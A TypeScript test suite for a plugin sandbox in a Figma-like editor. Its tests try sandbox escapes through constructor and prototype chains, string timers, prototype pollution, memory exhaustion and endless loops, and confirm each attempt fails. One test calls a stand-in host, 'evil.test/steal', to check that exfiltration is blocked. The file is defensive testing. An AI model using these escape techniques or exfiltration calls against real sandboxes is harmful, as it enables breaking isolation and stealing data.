import { describe, expect, test } from 'bun:test'

import { FigmaAPI } from '@lawha/core/figma-api'
import { startPlugin, type PluginBundle, type PluginHost } from '@lawha/core/figma-api/plugins'
import { SceneGraph } from '@lawha/scene-graph'

function bundle(code: string, manifest: Partial<PluginBundle['manifest']> = {}): PluginBundle {
  return {
    manifest: {
      name: 'Escape',
      id: 'escape',
      api: '1.0.0',
      main: 'code.js',
      editorType: ['figma'],
      ...manifest
    },
    code,
    ui: {}
  }
}

function host(fetched: string[] = []): PluginHost {
  return {
    showUI: () => undefined,
    postToUI: () => undefined,
    setUIVisible: () => undefined,
    resizeUI: () => undefined,
    closeUI: () => undefined,
    notify: () => undefined,
    fetch: async (url) => {
      fetched.push(url)
      return new Response('reached')
    },
    console: { ...console, error: () => undefined }
  }
}

/** Runs `code`, which reports by closing with a JSON message, and returns what it reported. */
async function report(code: string, manifest: Partial<PluginBundle['manifest']> = {}) {
  const figma = new FigmaAPI(new SceneGraph())
  const fetched: string[] = []
  const session = startPlugin({ figma, host: host(fetched), bundle: bundle(code, manifest) })
  const exit = await session.done
  if (exit.error) throw new Error(exit.error)
  return { result: JSON.parse(exit.message ?? 'null') as unknown, fetched }
}

/** Each attempt is an expression; the plugin reports whether it threw and what it returned. */
function attempts(cases: Record<string, string>): string {
  const entries = Object.entries(cases)
    .map(
      ([name, expression]) => `
      try { out[${JSON.stringify(name)}] = String((() => ${expression})()) }
      catch (e) { out[${JSON.stringify(name)}] = 'threw' }`
    )
    .join('\n')
  return `const out = {}\n${entries}\nfigma.closePlugin(JSON.stringify(out))`
}

const SECRET = '__lawhaHostSecret'

describe('the plugin sandbox', () => {
  test('host globals, storage, DOM, and runtimes are not there', async () => {
    Object.assign(globalThis, { [SECRET]: 'host only' })
    try {
      const { result } = await report(
        attempts({
          window: 'typeof window',
          document: 'typeof document',
          localStorage: 'typeof localStorage',
          sessionStorage: 'typeof sessionStorage',
          indexedDB: 'typeof indexedDB',
          caches: 'typeof caches',
          XMLHttpRequest: 'typeof XMLHttpRequest',
          WebSocket: 'typeof WebSocket',
          Worker: 'typeof Worker',
          importScripts: 'typeof importScripts',
          process: 'typeof process',
          require: 'typeof require',
          Bun: 'typeof Bun',
          navigator: 'typeof navigator',
          secret: `typeof globalThis.${SECRET}`,
          fromFunction: `typeof Function('return this')().${SECRET}`,
          fromFunctionProcess: "typeof Function('return this')().process"
        })
      )
      expect(Object.values(result as Record<string, string>)).toEqual(
        Array.from({ length: 17 }, () => 'undefined')
      )
    } finally {
      Reflect.deleteProperty(globalThis, SECRET)
    }
  })

  test("constructor and prototype chains of the API never reach the host's Function", async () => {
    Object.assign(globalThis, { [SECRET]: 'host only' })
    try {
      const { result } = await report(
        attempts({
          figmaConstructor: `figma.constructor.constructor('return globalThis')().${SECRET}`,
          methodConstructor: `figma.createRectangle.constructor('return process')()`,
          nodeConstructor: `figma.createRectangle().constructor`,
          proto: `figma.__proto__`,
          protoOfNode: `Object.getPrototypeOf(figma.currentPage).constructor.constructor('return this')().${SECRET}`,
          prototypeKey: `figma.createRectangle.prototype`,
          graph: `figma.graph`,
          privateField: `figma._nodeCache`,
          errorConstructor: `(() => { try { figma.getNodeById(42).remove() } catch (e) { return e.constructor.constructor('return this')().${SECRET} } })()`,
          newHostFunction: `new figma.createRectangle()`,
          lawhaConstructor: `lawha.constructor`,
          uiConstructor: `figma.ui.postMessage.constructor`
        })
      )
      expect(result).toEqual({
        figmaConstructor: 'threw',
        methodConstructor: 'threw',
        nodeConstructor: 'undefined',
        proto: 'undefined',
        protoOfNode: 'undefined',
        prototypeKey: 'threw',
        graph: 'undefined',
        privateField: 'undefined',
        errorConstructor: 'undefined',
        newHostFunction: 'threw',
        lawhaConstructor: 'undefined',
        uiConstructor: 'threw'
      })
    } finally {
      Reflect.deleteProperty(globalThis, SECRET)
    }
  })

  test('timers take functions only, so a string is never evaluated on the host', async () => {
    Object.assign(globalThis, { [SECRET]: 'untouched' })
    try {
      const { result } = await report(
        attempts({
          stringTimer: `setTimeout("globalThis.${SECRET} = 'changed'", 0)`,
          stringInterval: `setInterval("globalThis.${SECRET} = 'changed'", 0)`
        })
      )
      expect(result).toEqual({ stringTimer: 'threw', stringInterval: 'threw' })
      await new Promise((resolve) => {
        setTimeout(resolve, 10)
      })
      expect(Reflect.get(globalThis, SECRET)).toBe('untouched')
    } finally {
      Reflect.deleteProperty(globalThis, SECRET)
    }
  })

  test("the plugin cannot change the host's prototypes or the API's methods", async () => {
    const { result } = await report(`
      Object.prototype.polluted = 'yes'
      Array.prototype.push = () => 0
      const out = {}
      try { figma.createRectangle = () => 'mine'; out.replace = 'replaced' } catch (e) { out.replace = 'threw' }
      try { figma.ui.postMessage = () => 'mine'; out.replaceUI = 'replaced' } catch (e) { out.replaceUI = 'threw' }
      out.rectangle = figma.createRectangle().type
      figma.closePlugin(JSON.stringify(out))
    `)
    expect(result).toEqual({ replace: 'threw', replaceUI: 'threw', rectangle: 'RECTANGLE' })
    expect(Reflect.get({}, 'polluted')).toBeUndefined()
    const list: number[] = []
    list.push(1)
    expect(list).toEqual([1])
  })

  test('the network is only what networkAccess allows, for fetch and createImageAsync', async () => {
    const { result, fetched } = await report(
      `
      const out = {}
      try { await fetch('https://evil.test/steal?d=1'); out.evil = 'reached' } catch (e) { out.evil = 'threw' }
      try { await figma.createImageAsync('https://evil.test/pixel.png'); out.image = 'reached' } catch (e) { out.image = e.message }
      out.allowed = await (await fetch('https://api.example.com/ok')).text()
      figma.closePlugin(JSON.stringify(out))
    `,
      { networkAccess: { allowedDomains: ['api.example.com'] } }
    )
    expect(result).toEqual({
      evil: 'threw',
      image:
        "in createImageAsync: https://evil.test/pixel.png is not in the manifest's networkAccess.allowedDomains",
      allowed: 'reached'
    })
    expect(fetched).toEqual(['https://api.example.com/ok'])
  })

  test('an endless loop is stopped and the host keeps running', async () => {
    const figma = new FigmaAPI(new SceneGraph())
    const session = startPlugin({
      figma,
      host: host(),
      bundle: bundle('while (true) {}'),
      limits: { turnMilliseconds: 200 }
    })
    const exit = await session.done
    expect(exit.error).toContain('interrupted')
    expect(session.running).toBe(false)
  })

  test('a plugin that fills its memory is stopped', async () => {
    const figma = new FigmaAPI(new SceneGraph())
    const session = startPlugin({
      figma,
      host: host(),
      bundle: bundle('const chunks = []; while (true) chunks.push(new Array(100000).fill(1))'),
      limits: { memoryBytes: 16 * 1024 * 1024 }
    })
    const exit = await session.done
    expect(exit.error).toMatch(/out of memory|stopped/i)
  })

  test('plugins run at the same time, each in its own interpreter', async () => {
    const figma = new FigmaAPI(new SceneGraph())
    const notes: Record<string, string[]> = { a: [], b: [] }
    const start = (id: 'a' | 'b', code: string) =>
      startPlugin({
        figma,
        host: { ...host(), notify: (message) => notes[id].push(message) },
        bundle: bundle(code, { id, name: id })
      })
    const a = start(
      'a',
      `globalThis.shared = 'from a'; Object.prototype.mark = 'a'
       figma.on('selectionchange', () => figma.notify('a sees ' + typeof globalThis.shared + ' ' + ({}).mark))`
    )
    const b = start(
      'b',
      `figma.on('selectionchange', () => figma.notify('b sees ' + typeof globalThis.shared + ' ' + ({}).mark))
       figma.createRectangle().name = 'from b'`
    )
    await Promise.all([a.ready, b.ready])
    expect(a.running && b.running).toBe(true)
    await Promise.all([a.emit('selectionchange'), b.emit('selectionchange')])
    expect(notes).toEqual({ a: ['a sees string a'], b: ['b sees undefined undefined'] })
    expect(figma.currentPage.children.map((node) => node.name)).toEqual(['from b'])
    a.close()
    await b.emit('selectionchange')
    expect(b.running).toBe(true)
    expect(notes.b).toHaveLength(2)
    b.close()
  })

  test('values cross as copies or handles with Figma identity kept', async () => {
    const { result } = await report(`
      const rect = figma.createRectangle()
      figma.currentPage.appendChild(rect)
      rect.cornerRadius = 4
      const fills = rect.fills
      const out = {
        same: figma.currentPage.children[0] === rect,
        mixed: typeof figma.mixed,
        fills: Array.isArray(fills) && fills.length,
        keys: JSON.stringify(Object.keys({ ...{ a: 1 } })),
        bytes: figma.base64Encode(new Uint8Array([1, 2, 3])) + ':' + Array.from(figma.base64Decode('AQID')).join(','),
        found: figma.currentPage.findAll((node) => node.type === 'RECTANGLE').length,
        nan: Number.isNaN(NaN)
      }
      figma.closePlugin(JSON.stringify(out))
    `)
    expect(result).toEqual({
      same: true,
      mixed: 'symbol',
      fills: 1,
      keys: '["a"]',
      bytes: 'AQID:1,2,3',
      found: 1,
      nan: true
    })
  })
})
